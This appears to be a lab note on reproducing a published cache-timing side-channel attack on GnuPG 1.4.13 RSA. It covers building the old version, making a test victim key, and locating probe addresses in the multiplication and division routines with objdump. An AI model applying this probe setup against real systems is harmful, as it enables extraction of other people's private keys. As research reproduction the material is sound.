Reproducing GnuPG 1.4.13 Attacks
==================================

Compiling GnuPG
----------------

- Download: `ftp://ftp.gnupg.org/gcrypt/gnupg/gnupg-1.4.13.tar.bz2`
- Make sure to install `lib32-glibc` and `gcc-multilib`.

Run:

    ./configure --build=i686-pc-linux-gnu "CFLAGS=-m32" "CXXFLAGS=-m32" "LDFLAGS=-m32"
    make

The binary will show up in `./g10/gpg`.

Creating a Victim Private Key
------------------------------

Run:

    mkdir ./testconf
    chmod 700 ./testconf
    export GNUPGHOME="./testconf"
    ./g10/gpg --gen-key

Select:

    - RSA and RSA.
    - 2048 bits.
    - Never expires.
    - Name: "Test Key"

Encrypt a message to yourself:

    mkdir ./testfiles
    echo "Hello world" > ./testfiles/hello.txt
    ./g10/gpg -r "Test Key" -e ./testfiles/hello.txt

**NOTE:** This encrypted file is *not* signed, so when GnuPG decrypts it, it
will not validate any signature (This is probably OK, since if an attacker could
get a signed message to decrypt, they could probably get an unsigned one to
decrypt).

To Decrypt the message:

    ./g10/gpg -d ./testfiles/hello.txt.gpg

Finding Probe Addresses
------------------------

The `gpg.probe` from the authors is reproduced here:

    map /home/yval/gpg
    base 0x8048000
    probe 0x0810090d S #mpih-mul.c:270 (First cache line in mpih_sqr_n())
    probe 0x080ffdc3 r #mpih-div.c:329 (Loop in default case in mpihelp_divrem())
    probe 0x08100191 M #mpih-mul.c:121 (First cache line of mul_n())
    slot 2048

You need to change the `map` (to the path of ./g10/gpg). Leave the `base` and
`slot` alone. Change the addresses to what is described in the comments.

Do this by disassembling with `objdump` and using `less` to search for the
function names:

    objdump -D -M intel ./g10/gpg | less

I get:

    map ./g10/gpg
    base 0x8048000
    probe 0x080f7607 S #mpih-mul.c:270 (First cache line in mpih_sqr_n())
    probe 0x080f6c45 r #mpih-div.c:329 (Loop in default case in mpihelp_divrem())
    probe 0x080f6fa8 M #mpih-mul.c:121 (First cache line of mul_n())
    slot 2048

The `mpih-div.c` one is kind of hard to find. It's after the first `if` in the
`default` case, which looks like:


    80f6bfd:       e8 b6 1e 00 00          call   80f8ab8 <mpihelp_sub_n>
    80f6c02:       83 c4 10                add    esp,0x10
    80f6c05:       8b 45 1c                mov    eax,DWORD PTR [ebp+0x1c]
    80f6c08:       05 ff ff ff 3f          add    eax,0x3fffffff
    80f6c0d:       8d 14 85 00 00 00 00    lea    edx,[eax*4+0x0]
    80f6c14:       8b 45 10                mov    eax,DWORD PTR [ebp+0x10]
    80f6c17:       01 d0                   add    eax,edx
    80f6c19:       8b 00                   mov    eax,DWORD PTR [eax]
    80f6c1b:       89 45 d0                mov    DWORD PTR [ebp-0x30],eax
    80f6c1e:       c7 45 f4 01 00 00 00    mov    DWORD PTR [ebp-0xc],0x1
    # ... After this is the loop ...

Make sure the cache line you pick covers the first 'if' inside the loop (both
branches).

